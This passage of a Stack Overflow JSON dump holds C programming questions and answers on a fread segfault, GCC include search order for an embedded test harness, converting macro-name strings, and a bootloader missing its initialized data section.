"profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1449676888, "post_id": 34182301, "comment_id": 56112949, "body": "@szczurcio Update: I am indeed getting the Segfault in the function <code>fread(*board, sizeof(char), SIZE, source) != SIZE</code> . I tried to put a printf() between that line and the return to the main, and it never prints. I am none the wiser, except that now I know I&#39;m not getting the segfault from using the failed file."}, {"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1449680534, "post_id": 34182301, "comment_id": 56115524, "body": "I don&#39;t believe so, you&#39;re not doing anything if <code>fopen</code> fails because you have a check for this. Can you ensure that the file is opened correctly, i.e. <code>fopen</code> doesn&#39;t return <code>NULL</code>? Simply check this one thing, ignore reading anything from the stream for now."}], "answers": [{"comments": [{"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1449687859, "post_id": 34185290, "comment_id": 56120188, "body": "What does this matter? Both are arrays of <code>char</code>, except that the second one is allocated on the caller&#39;s stack and as such is mutable."}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "reply_to_user": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "edited": false, "score": 0, "creation_date": 1449690868, "post_id": 34185290, "comment_id": 56121828, "body": "@ szczurcio, it <i>shouldn&#39;t</i> matter but I have seen (and experienced) it happen."}], "tags": [], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "is_accepted": false, "score": 2, "last_activity_date": 1449682432, "creation_date": 1449682432, "answer_id": 34185290, "question_id": 34182301, "link": "https://stackoverflow.com/questions/34182301/error-when-passing-filename-per-reference-c/34185290#34185290", "title": "Error when passing filename per reference (C)", "body": "<p>Following many comments with suggestions, I have seen strange things when a constant char literal is passed:</p>\n\n<pre><code>#define NAME \"name\"\nchar* filename = NAME;\n</code></pre>\n\n<p>This assigns a pointer to a constant char literal to <code>filename</code>. Please try:</p>\n\n<pre><code>#define NAME \"name\"\nchar filename[] = NAME;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 18805, "user_id": 34771, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7c1a3f9227c0cb408f8831d27d611ab2?s=128&d=identicon&r=PG", "display_name": "Vatine", "link": "https://stackoverflow.com/users/34771/vatine"}, "is_accepted": false, "score": 1, "last_activity_date": 1449682855, "creation_date": 1449682855, "answer_id": 34185423, "question_id": 34182301, "link": "https://stackoverflow.com/questions/34182301/error-when-passing-filename-per-reference-c/34185423#34185423", "title": "Error when passing filename per reference (C)", "body": "<p>Check your status values:</p>\n\n<pre><code>rv = loadFile(&amp;board, filename);\nif (rv == -1) {\n  perror(\"Error opening file\");\n  return 1;\n}\n</code></pre>\n\n<p>This should (hopefully) give you an error message you can troubleshoot further. Using a <code>const char *</code> as an argument to <code>fopen()</code> should be OK.</p>\n"}], "owner": {"reputation": 551, "user_id": 3000271, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/40868737f7c22bc2e27a64ab6d098aa3?s=128&d=identicon&r=PG&f=1", "display_name": "BigBadWolf", "link": "https://stackoverflow.com/users/3000271/bigbadwolf"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1449682855, "creation_date": 1449674033, "question_id": 34182301, "link": "https://stackoverflow.com/questions/34182301/error-when-passing-filename-per-reference-c", "title": "Error when passing filename per reference (C)", "body": "<p>I need to pass a char pointer and filename per reference, and allocate a size for the pointer in that same function. (in the program it reads the size it needs to allocate from the file).</p>\n\n<p>I created the file and also checked it in a hex editor, and it does exist.</p>\n\n<p>I have tried to run it on GCC and Cygwin, it doesn't seem to be a compiler specific problem.</p>\n\n<p>The following code is just the barebones, but still contains the same error:\nGDB tells me it's a segfault caused by the file not existing. (\"No such file or directory\"). </p>\n\n<p>Where did I go wrong?</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#define SIZE 50\n#define NAME \"name\"\n\nint loadFile(char** board, char* filename);\n\nint main(int argc, char const *argv[])\n{\n  char* board;\n  char* filename = NAME;\n\n  loadFile(&amp;board, filename);\n\n  board[49] = '\\0';\n\n  return 0;\n}\n\n\nint loadFile(char** board, char* filename)\n{\n  FILE* source = fopen(filename, \"rb\");\n\n  if(source == NULL)\n  {\n    printf(\"Error loading file.\\n\");\n    return -1;\n  }\n\n  *board = malloc(SIZE);\n\n  if(fread(*board, sizeof(char), SIZE, source) != SIZE)\n  {\n    fclose(source);\n    printf(\"Error loading file.\\n\");\n    return -2;\n  }\n  return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "gcc", "include-path"], "comments": [{"owner": {"reputation": 145, "user_id": 2624808, "user_type": "registered", "profile_image": "https://graph.facebook.com/1357740553/picture?type=large", "display_name": "James H", "link": "https://stackoverflow.com/users/2624808/james-h"}, "edited": false, "score": 0, "creation_date": 1449674145, "post_id": 34182152, "comment_id": 56110821, "body": "A quick search turned up <a href=\"http://gcc.gnu.org/onlinedocs/cpp/Search-Path.html#Search-Path\" rel=\"nofollow noreferrer\">this</a>, the -nostdinc in addition to using -I might be of help here. I am posting this as a comment rather than answer because I don&#39;t know if it really answers your question and I don&#39;t have a linux box handy to try this out at the moment."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1449674783, "post_id": 34182152, "comment_id": 56111308, "body": "If you add a path to be searched using the <code>-I</code> option, then you can use the <code>&lt;&gt;</code> syntax to include files in that directory, and the preprocessor will then look in the added search paths for the file."}, {"owner": {"reputation": 48092, "user_id": 136208, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/8a30f566f1b7c9ae44cf245138850ba4?s=128&d=identicon&r=PG", "display_name": "AProgrammer", "link": "https://stackoverflow.com/users/136208/aprogrammer"}, "edited": false, "score": 0, "creation_date": 1449679899, "post_id": 34182152, "comment_id": 56115098, "body": "I&#39;m not sure I understand what you want.  I&#39;d suggest that you compile with gcc --verbose and give us the search path it output for both version of include, as well as the command line argument you gave and the search path you&#39;d have liked.  BTW <code>-I.</code> looks in the directory where gcc has been invoked, while -I- remove the possibility to look in the directory of the file containing the include directive, so they are indeed different."}, {"owner": {"reputation": 115, "user_id": 2837591, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/467b22028f01cc4230c6d627709ea489?s=128&d=identicon&r=PG&f=1", "display_name": "Enok82", "link": "https://stackoverflow.com/users/2837591/enok82"}, "reply_to_user": {"reputation": 145, "user_id": 2624808, "user_type": "registered", "profile_image": "https://graph.facebook.com/1357740553/picture?type=large", "display_name": "James H", "link": "https://stackoverflow.com/users/2624808/james-h"}, "edited": false, "score": 0, "creation_date": 1449735367, "post_id": 34182152, "comment_id": 56139012, "body": "@JamesH Thanks for the find but using the <code>-nostdinc</code> will remove all standard include paths except the <code>.</code> reference leaving it to still be the first one to be searched."}, {"owner": {"reputation": 115, "user_id": 2837591, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/467b22028f01cc4230c6d627709ea489?s=128&d=identicon&r=PG&f=1", "display_name": "Enok82", "link": "https://stackoverflow.com/users/2837591/enok82"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1449735449, "post_id": 34182152, "comment_id": 56139067, "body": "@Joachim The directories added with <code>-I&lt;dir&gt;</code>will be searched after the default <code>.</code>reference."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1449735865, "post_id": 34182152, "comment_id": 56139280, "body": "@Enok82 I just tested with GCC version 4.7, using two header files, <code>.&#47;foo.h</code> and <code>.&#47;t&#47;foo.h</code>. If I used <code>#include &lt;foo.h&gt;</code> without any special option then <code>.&#47;foo.h</code> was included. If I added <code>-It</code> to add the <code>t</code> directory to the search path then <code>.&#47;t&#47;foo.h</code> was included. So no, <code>.</code> is not searched first. If I use <code>#include &quot;foo.h&quot;</code> <i>then</i> the local <code>.</code> directory is searched first. So add the directory with <code>-I</code> and then use <code>#include &lt;your_file.h&gt;</code> (with the angle-brackets), and it should work."}, {"owner": {"reputation": 115, "user_id": 2837591, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/467b22028f01cc4230c6d627709ea489?s=128&d=identicon&r=PG&f=1", "display_name": "Enok82", "link": "https://stackoverflow.com/users/2837591/enok82"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1449736629, "post_id": 34182152, "comment_id": 56139664, "body": "@Joachim Sorry missed that the angle brackets were key for this to work. My problem then is that this is a test environment for an embedded project which code base is not really mine to alter as i wish. Having the code base owners changing <code>&quot; &quot;</code> to <code>&lt; &gt;</code> is however an alternative if nothing else works and it won&#39;t cause any problems. Tack s&#229; mycket!"}, {"owner": {"reputation": 115, "user_id": 2837591, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/467b22028f01cc4230c6d627709ea489?s=128&d=identicon&r=PG&f=1", "display_name": "Enok82", "link": "https://stackoverflow.com/users/2837591/enok82"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1449739019, "post_id": 34182152, "comment_id": 56141067, "body": "@Joachim After some thinking and reading @Chris&#39;s answer i&#39;ve realised (at least i think so) that using <code>&lt; &gt;</code> style includes will have the same effect on <code>.</code> as using <code>&quot; &quot;</code> and <code>-I-</code>, removing it from the search path for that inclusion. Removing the <code>.</code> is not in my interest i only want to search it AFTER <code>Common</code> has been searched."}, {"owner": {"reputation": 145, "user_id": 2624808, "user_type": "registered", "profile_image": "https://graph.facebook.com/1357740553/picture?type=large", "display_name": "James H", "link": "https://stackoverflow.com/users/2624808/james-h"}, "edited": false, "score": 0, "creation_date": 1449807774, "post_id": 34182152, "comment_id": 56176638, "body": "Actually, after an additional search, it looks like <code>-iquote</code> may be what you are looking for. Take a look <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Directory-Options.html\" rel=\"nofollow noreferrer\">here</a>"}, {"owner": {"reputation": 115, "user_id": 2837591, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/467b22028f01cc4230c6d627709ea489?s=128&d=identicon&r=PG&f=1", "display_name": "Enok82", "link": "https://stackoverflow.com/users/2837591/enok82"}, "reply_to_user": {"reputation": 145, "user_id": 2624808, "user_type": "registered", "profile_image": "https://graph.facebook.com/1357740553/picture?type=large", "display_name": "James H", "link": "https://stackoverflow.com/users/2624808/james-h"}, "edited": false, "score": 0, "creation_date": 1449822311, "post_id": 34182152, "comment_id": 56182228, "body": "@JamesH No not really. Even though you can&#39;t see it when using <code>-verbose</code> the &quot;current directory&quot; is unfortunately searched before directories added using either <code>-iquote&lt;dir&gt;</code> or <code>-I&lt;dir&gt;</code>."}], "answers": [{"comments": [{"owner": {"reputation": 115, "user_id": 2837591, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/467b22028f01cc4230c6d627709ea489?s=128&d=identicon&r=PG&f=1", "display_name": "Enok82", "link": "https://stackoverflow.com/users/2837591/enok82"}, "edited": false, "score": 0, "creation_date": 1449738448, "post_id": 34185375, "comment_id": 56140759, "body": "It would seem the soultion using GCC&#39;s inlude options is a dead end for me then since the &quot;current file&#39;s directory&quot; is quite important if source in directory A is including headers in directory B who in turn also is including headers in directory B. This if <code>-IB </code>is not added to the option list but that would leave an unmaintainable, long list of options in the Makefile. It&#39;s a great answer but i won&#39;t mark it as the accepted one yet if someone comes up with a work around! Thanks!"}, {"owner": {"reputation": 115, "user_id": 2837591, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/467b22028f01cc4230c6d627709ea489?s=128&d=identicon&r=PG&f=1", "display_name": "Enok82", "link": "https://stackoverflow.com/users/2837591/enok82"}, "edited": false, "score": 0, "creation_date": 1450163424, "post_id": 34185375, "comment_id": 56307603, "body": "The solution i choose for my problem was to clone all the Halcogen headers containing hardware references using a Python script. That same Pyhton script also replaces all hardware addresses with actual observable an mutable varaibles. This solution is only working since the Halcogen layer is only subjected to change if the usage of processor functions and peripherals change, wich is rare in most mature embedded projects. Answer marked as accepted."}], "tags": [], "owner": {"reputation": 100407, "user_id": 16406, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/fadf252892475e9b177d5cd5e8b24145?s=128&d=identicon&r=PG&f=1", "display_name": "Chris Dodd", "link": "https://stackoverflow.com/users/16406/chris-dodd"}, "is_accepted": true, "score": 4, "last_activity_date": 1449682687, "creation_date": 1449682687, "answer_id": 34185375, "question_id": 34182152, "link": "https://stackoverflow.com/questions/34182152/make-gcc-look-for-headers-in-dir-before/34185375#34185375", "title": "Make GCC look for headers in &lt;dir&gt; before ./", "body": "<p>The problem you are having is with <code>#include \"</code>...<code>\"</code> as opposed to <code>#include &lt;</code>...<code>&gt;</code></p>\n\n<p>With a normal C compiler, using the <code>\"</code> form always searches in the same directory as the current file, and <em>then</em> looks in the include path set by <code>-I</code>.  If you want to search somewhere else before looking in the current file's directory, there's no easy way to do it.</p>\n\n<p>You can use gcc's <code>-I-</code> to <em>inhibit</em> searching in the current file's directory, and add other directories to use only for <code>\"</code> include files (not for <code>&lt;&gt;</code>), but if you use that, there's no way to get back the behavior of searching in the current file's directory.</p>\n\n<p>You can try something like:</p>\n\n<pre><code>-ICommon -I. -I- -Iwhatever\n</code></pre>\n\n<p>This will search for <code>\"</code> includes first in <code>Common</code>, then in the current working directory, then in <code>whatever</code> (and the rest of the normal path), while <code>&lt;&gt;</code> will start in <code>whatever</code>.  Unfortunately, it will never search in the current file's directory, if that is different from the current working directory.</p>\n\n<p><code>-I-</code> is also deprecated, so may go away soon.</p>\n"}], "owner": {"reputation": 115, "user_id": 2837591, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/467b22028f01cc4230c6d627709ea489?s=128&d=identicon&r=PG&f=1", "display_name": "Enok82", "link": "https://stackoverflow.com/users/2837591/enok82"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 833, "favorite_count": 0, "accepted_answer_id": 34185375, "answer_count": 1, "score": 2, "last_activity_date": 1449682687, "creation_date": 1449673648, "last_edit_date": 1449677853, "question_id": 34182152, "link": "https://stackoverflow.com/questions/34182152/make-gcc-look-for-headers-in-dir-before", "title": "Make GCC look for headers in &lt;dir&gt; before ./", "body": "<h2>Background:</h2>\n\n<p>I am putting together a test environment for an embedded project. Since it's an embedded project it tries to access hardware registers e.g. ADC results, timer settings, interrupt flags...</p>\n\n<p>These registers are implemented automatically by Halcogen (it's a TI processor), as defines pointing to specific addresses.</p>\n\n<pre><code>    #pragma system_include\n\n    #ifndef __REG_FLASH_H__\n    #define __REG_FLASH_H__\n\n    /* USER CODE BEGIN (0) */\n    /* USER CODE END */\n\n    #include \"sys_common.h\"\n\n    typedef volatile struct flashWBase\n    {\n        uint32 FRDCNTL;       /* 0x0000 */\n        uint32   rsvd1;       /* 0x0004 */\n        .\n        .\n        .\n        uint32 EESTATUS;      /* 0x031C */\n        uint32 EEUNCERRADD;   /* 0x0320 */\n    } flashWBASE_t;\n\n    #define flashWREG ((flashWBASE_t *)(0xFFF87000U)) //&lt;--- This one\n\n    #endif\n</code></pre>\n\n<h2>My attempted solution:</h2>\n\n<p>In order to compile and run this code on a MinGW Win7 machine these specific addresses need to be re-defined to be pointing to observable and mutable variables. I have a Python script that analyzes the source code; creating a new header file using the same name in a common directory containing:</p>\n\n<pre><code>    #ifndef _COMMON_INCLUDES_REG_FLASH_H_\n    #define _COMMON_INCLUDES_REG_FLASH_H_\n\n    #include \"..\\..\\W2_Library\\Halcogen\\Include\\reg_flash.h\" //&lt;--- original Halcogen header\n\n    #undef flashWREG\n    flashWBASE_t _flashWREG;\n    #define flashWREG (&amp;_flashWREG)\n\n    #endif\n</code></pre>\n\n<p>I have made many attempts using <code>-I-</code>, <code>-I&lt;dir&gt;</code> and <code>-iquote</code> to redirect inclusion of the headers getting farthest using the deprecated <code>-I-</code> to make GCC ignore the <code>.</code> directory. I would however rather have my <code>Common</code> folder precede the <code>.</code> than ignoring all together. Adding a <code>-I.</code> does not seem to be the same thing, I get the feeling it expands to the directory of the source code and doesn't stay \"relative\" as GCC delves deeper into the inclusion tree like the original <code>.</code> do.</p>\n\n<p>Letting my Python script clone the entire header, replacing only the HW address with a variable, could be a solution. Just redefining the register defines in a separate header does however feel less prone to break.</p>\n\n<h2>Question:</h2>\n\n<p>Is there any other ways to alter the search order?\nI have read several questions about <code>-I-</code> but none has really had any answers as to how you get around the behaviour. <a href=\"/q/3162510\">This question</a> is pretty close but unlike that user, I am not using precompiled headers.</p>\n\n<p>There are a few assumptions above and please correct me if they are wrong!</p>\n"}, {"tags": ["c", "macros"], "answers": [{"comments": [{"owner": {"reputation": 949, "user_id": 3526887, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/aada42137301240049d64eab0e1fba62?s=128&d=identicon&r=PG&f=1", "display_name": "anothertest", "link": "https://stackoverflow.com/users/3526887/anothertest"}, "edited": false, "score": 0, "creation_date": 1449673362, "post_id": 34182015, "comment_id": 56110271, "body": "There is no general way to do this? I have to do it for all the macro I want?"}, {"owner": {"reputation": 3107, "user_id": 1928235, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/8119b4672d36b04e505f44e0e9187eea?s=128&d=identicon&r=PG", "display_name": "user4520", "link": "https://stackoverflow.com/users/1928235/user4520"}, "reply_to_user": {"reputation": 949, "user_id": 3526887, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/aada42137301240049d64eab0e1fba62?s=128&d=identicon&r=PG&f=1", "display_name": "anothertest", "link": "https://stackoverflow.com/users/3526887/anothertest"}, "edited": false, "score": 0, "creation_date": 1449673620, "post_id": 34182015, "comment_id": 56110444, "body": "@anothertest Yes, in C there&#39;s no other option."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 949, "user_id": 3526887, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/aada42137301240049d64eab0e1fba62?s=128&d=identicon&r=PG&f=1", "display_name": "anothertest", "link": "https://stackoverflow.com/users/3526887/anothertest"}, "edited": false, "score": 0, "creation_date": 1449673623, "post_id": 34182015, "comment_id": 56110449, "body": "@anothertest: I modified the answer for a general method to generate such code."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": false, "score": 3, "last_activity_date": 1449673775, "last_edit_date": 1449673775, "creation_date": 1449673250, "answer_id": 34182015, "question_id": 34181907, "link": "https://stackoverflow.com/questions/34181907/convert-string-of-macro-to-macro/34182015#34182015", "title": "Convert string of macro to macro", "body": "<p>Here is the simplest method I can think of:</p>\n\n<pre><code>#include &lt;errno.h&gt;\n\nif (!strcmp(str, \"EINVAL\"))\n    value = EINVAL;\n</code></pre>\n\n<p>No preprocessor trick can convert the string literal to the corresponding symbol.</p>\n\n<p>But you can use the preprocessor to simplify a sequence of such tests:</p>\n\n<pre><code>    value = 0;\n#define conv(s)  do { if (!strcmp(str, #s)) value = s; } while (0)\n    conv(EINVAL);\n    conv(ENOMEM);\n    conv(ERANGE);\n    conv(EINTR);\n#undef conv\n</code></pre>\n\n<p>A usual, be careful with the preprocessor...</p>\n"}], "owner": {"reputation": 949, "user_id": 3526887, "user_type": "registered", "accept_rate": 66, "profile_image": "https://www.gravatar.com/avatar/aada42137301240049d64eab0e1fba62?s=128&d=identicon&r=PG&f=1", "display_name": "anothertest", "link": "https://stackoverflow.com/users/3526887/anothertest"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 446, "favorite_count": 0, "closed_date": 1449697231, "answer_count": 1, "score": 0, "last_activity_date": 1449673775, "creation_date": 1449672957, "question_id": 34181907, "link": "https://stackoverflow.com/questions/34181907/convert-string-of-macro-to-macro", "closed_reason": "Needs details or clarity", "title": "Convert string of macro to macro", "body": "<p>How can a string like \"EINVAL\" be converted into EINVAL?</p>\n\n<p>I have to convert a lot of macro string to their value, what can be done?</p>\n"}, {"tags": ["c", "gcc", "build-process", "binaryfiles", "bootloader"], "comments": [{"owner": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 0, "creation_date": 1449678236, "post_id": 34181799, "comment_id": 56113847, "body": "You would likely get a specific answer to fix your code if you showed us your bootloader code which appears to be loading the second stage (startup.bin) at physical address 0x08000. As well show us your <code>main.c</code> as well (or at least a stripped down one that can reproduce the problem)."}, {"owner": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 0, "creation_date": 1449700308, "post_id": 34181799, "comment_id": 56126899, "body": "I would also have the concern if you were generating 32 bit code from the <i>C</i> compiler and trying to run it in real mode. That would cause some unusual things to occur, which comes back to the bootloader and main.c (and other related code - like .h files) being given to provide a good answer. As it is we don&#39;t have a <a href=\"http://stackoverflow.com/help/mcve\">Minimal Complete Verifiable Example</a>."}, {"owner": {"reputation": 71, "user_id": 5602950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/58a288bf71b3d964ef493468868a3c38?s=128&d=identicon&r=PG&f=1", "display_name": "ffcactus", "link": "https://stackoverflow.com/users/5602950/ffcactus"}, "reply_to_user": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 0, "creation_date": 1449727729, "post_id": 34181799, "comment_id": 56135525, "body": "Hi Michael Petch, I edit my question. My bootloader is generally works fine. The problem is how to find out the initialized data in the binary(the binary is converted from elf file)."}, {"owner": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 0, "creation_date": 1449730042, "post_id": 34181799, "comment_id": 56136525, "body": "It appears your bootloader didn&#39;t work fine ;-) ."}], "answers": [{"comments": [{"owner": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "edited": false, "score": 0, "creation_date": 1449782678, "post_id": 34195369, "comment_id": 56168282, "body": "How did you discover this?  Also, how did you fix this?  Before your answer post, I had been considering a data section relocation problem. If you changed your build commands, to help others with similar problems in the future, it would be nice if you could edit your answer and add the changed commands"}], "tags": [], "owner": {"reputation": 71, "user_id": 5602950, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/58a288bf71b3d964ef493468868a3c38?s=128&d=identicon&r=PG&f=1", "display_name": "ffcactus", "link": "https://stackoverflow.com/users/5602950/ffcactus"}, "is_accepted": false, "score": 1, "last_activity_date": 1454110471, "last_edit_date": 1454110471, "creation_date": 1449729826, "answer_id": 34195369, "question_id": 34181799, "link": "https://stackoverflow.com/questions/34181799/how-bootloader-find-the-ds-section-in-binary-file/34195369#34195369", "title": "How bootloader find the DS section in binary file", "body": "<p>My problem is solved. My bootloader only copied 1 sector (2k bytes) from the CD, and my <em>C</em> program is bigger than 2k, so it left the initialized values uncopied.</p>\n\n<p>To make the the question clearer, I'd like to better explain it. Here is an example:</p>\n\n<pre><code>baibin@baibin-Z620:~/workspace/tmp$ cat main.c\n#include &lt;stdint.h&gt;\n\nuint16_t ds = 0x1111;\nvoid _start(void) {\n        ds++;\n}\nbaibin@baibin-Z620:~/workspace/tmp$ cat Makefile\nall:\n        i686-elf-gcc -c main.c -o main.o -std=gnu99 -ffreestanding -Wall -Wextra\n        i686-elf-gcc -m32 -Ttext 0x8000 -o startup.elf -ffreestanding -nostdlib main.o -lgcc\n        objcopy -O binary startup.elf startup.bin\nclean:\n        @rm main.o startup.*\nbaibin@baibin-Z620:~/workspace/tmp$ objdump -s -S startup.elf\n\nstartup.elf:     file format elf32-i386\n\nContents of section .text:\n 8000 5589e50f b7055090 000083c0 0166a350  U.....P......f.P\n 8010 90000090 5dc3                        ....].\nContents of section .eh_frame:\n 8018 14000000 00000000 017a5200 017c0801  .........zR..|..\n 8028 1b0c0404 88010000 1c000000 1c000000  ................\n 8038 c8ffffff 16000000 00410e08 8502420d  .........A....B.\n 8048 0552c50c 04040000                    .R......\nContents of section .data:\n 9050 1111                                 ..\nContents of section .comment:\n 0000 4743433a 2028474e 55292035 2e322e30  GCC: (GNU) 5.2.0\n 0010 00                                   .\n\nDisassembly of section .text:\n\n00008000 &lt;_start&gt;:\n    8000:       55                      push   %ebp\n    8001:       89 e5                   mov    %esp,%ebp\n    8003:       0f b7 05 50 90 00 00    movzwl 0x9050,%eax\n    800a:       83 c0 01                add    $0x1,%eax\n    800d:       66 a3 50 90 00 00       mov    %ax,0x9050\n    8013:       90                      nop\n    8014:       5d                      pop    %ebp\n    8015:       c3                      ret\nbaibin@baibin-Z620:~/workspace/tmp$ hexdump -C startup.bin\n00000000  55 89 e5 0f b7 05 50 90  00 00 83 c0 01 66 a3 50  |U.....P......f.P|\n00000010  90 00 00 90 5d c3 00 00  14 00 00 00 00 00 00 00  |....]...........|\n00000020  01 7a 52 00 01 7c 08 01  1b 0c 04 04 88 01 00 00  |.zR..|..........|\n00000030  1c 00 00 00 1c 00 00 00  c8 ff ff ff 16 00 00 00  |................|\n00000040  00 41 0e 08 85 02 42 0d  05 52 c5 0c 04 04 00 00  |.A....B..R......|\n00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00001050  11 11                                             |..|\n00001052\nbaibin@baibin-Z620:~/workspace/tmp$\n</code></pre>\n\n<p>As you can see, the <em>DS</em> is expected to be located in 0x9050, after the the main be loaded. If my binary only loaded from 0x0000 to 0x0050, the <em>DS</em> won't be initialized properly.</p>\n\n<hr>\n\n<p>Craig Estey commented and asked the question \"<em>How did you discover this? Also, how did you fix this? Before your answer post, I had been considering a data section relocation problem. If you changed your build commands, to help others with similar problems in the future, it would be nice if you could edit your answer and add the changed commands</em>\" </p>\n\n<p>This is my reply to Craig Estey's question:</p>\n\n<p>I'm going to verify if my <em>C</em> executable works fine after the bootloader loads it. The easiest way is to show something on the screen. At first, I wrote a very simple <code>print()</code> like this:</p>\n\n<pre><code>void print() {\n    uint8_t x = 80 / 2;\n    uint8_t y = 25 / 2;\n    // print hello world;\n}\n</code></pre>\n\n<p>it works fine. the \"hello world\" print at the middle of the screen. Then I improve the function. I move the x, y outside as the static 